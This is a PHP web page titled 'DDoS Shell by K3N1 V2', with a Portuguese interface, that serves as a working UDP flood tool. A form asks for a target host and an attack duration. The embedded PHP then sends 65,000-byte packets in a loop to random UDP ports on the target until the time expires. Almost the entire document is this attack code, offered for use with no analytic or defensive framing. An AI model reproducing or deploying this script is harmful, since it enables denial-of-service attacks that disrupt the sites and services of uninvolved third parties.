<html>
<head>
	<title>DDoS Shell by K3N1</title>
	<meta charset="utf-8">
	<style type="text/css">
		body {
			background:#ddd;
			font-family: "Trebuchet MS";
			color: #000;
		}
		input[type="text"] {
			background-color: #ccc;
			border:1px solid #ccc;
			border-radius: 0;
			width: 250px;
			height: 30px;
		}
		input[type="submit"] {
			background-color: #ccc;
			border:1px solid #ccc;
			border-radius: 0;
			width: 250px;
			height: 30px;
		}
	</style>
</head>
<body>
	<center>
		<form method="post" action="">
			<h1>DDoS Shell by K3N1<font color="Red" face="courier" size="6" style="text-shadow: 0px 0px 10px;"></h1>
			<h2>V2<font color="Red" face="courier" size="6" style="text-shadow: 0px 0px 5px;"></h2>
			<input type="text" name="host" placeholder="Host do Site">
			<img height="300" src="http://www.clickgratis.com.br/fotos-imagens/caveira/aHR0cDovL2ltZzEucmVjYWRvc29ubGluZS5jb20vMzY5LzAyOC5naWY=.jpg" widht="50">
			<br />
			<input type="text" name="time" placeholder="Tempo do DDOS">
			<br />
			<input type="submit" value="Atacar!">
			<br />

			<?php 
				if(isset($_POST['host']) and isset($_POST['time'])) {
					$pacotes = 0;

					set_time_limit(0);

					$tempo=time();
					$tempo_maximo=$tempo+$_POST['time'];

					$host=htmlspecialchars($_POST['host']);
					for ($i=0; $i < 65000; $i++) { 
						$out .= 'X';
					}
					while(1) {
						$pacotes++;
						if(time() > $tempo_maximo) {
							break;
						}
						$gerar = rand(1,65000);
						$abrir=fsockopen("udp://".$host,$gerar,$errno,$errstr,5);
						if($abrir) {
							fwrite($abrir, $out);
							fclose($abrir);
						}
					}
					echo "Ataque finalizado!";
				}
			?>
		</form>
	</center>
</body>
</html>
